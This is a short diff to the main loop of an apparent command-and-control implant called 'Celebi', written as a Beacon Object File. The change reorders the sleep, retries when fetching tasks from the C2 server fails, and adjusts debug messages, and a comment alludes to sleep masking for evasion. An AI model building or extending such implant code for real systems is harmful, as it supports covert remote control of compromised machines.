@@ -170,11 +170,21 @@ void go() {
 	
 	while (1) {
 		// Look ma, no masking!
+		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
+		
 		TaskingReply tasking_reply = { 0 };
-		perform_tasking(&state, &tasking_reply);
+		BOOL task_result = perform_tasking(&state, &tasking_reply);
+		
+		if (task_result == FALSE) {
+			continue;
+		}
 		
 		#ifdef CELEBI_DEBUG
-		dprintf("Received tasking from C2 server!");
+		if (task_result == TRUE) {
+			dprintf("Received tasking from C2 server!");
+		} else {
+			dprintf("Failed to get tasking from C2 server.");
+		}
 		#endif
 		
 		for (int i = 0; i < tasking_reply.tasking_size; i++) {
@@ -182,6 +192,5 @@ void go() {
 		}
 		
 		free_tasking_reply(&tasking_reply);
-		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
 	}
 }
